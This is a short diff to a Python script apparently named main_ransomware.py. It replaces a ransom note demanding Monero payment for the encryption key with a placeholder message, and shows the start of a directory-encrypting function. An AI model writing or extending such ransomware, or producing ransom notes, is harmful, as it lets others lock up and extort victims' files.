@@ -25,7 +25,7 @@ decision = input("Do you want to encrypt a single directory (c) or do you want t
 def message():
     with open('RANSOM.txt', 'w') as ransom:
         ransom.write(key_art)
-        ransom.write("DEPOSIT 20000 XMR ON THIS MONERO WALLET TO GET THE ENCRYPTION KEY")
+        ransom.write("Edit the message in main_ransomware.py")
 
 def encrypt(dir):
     content = os.listdir(dir)
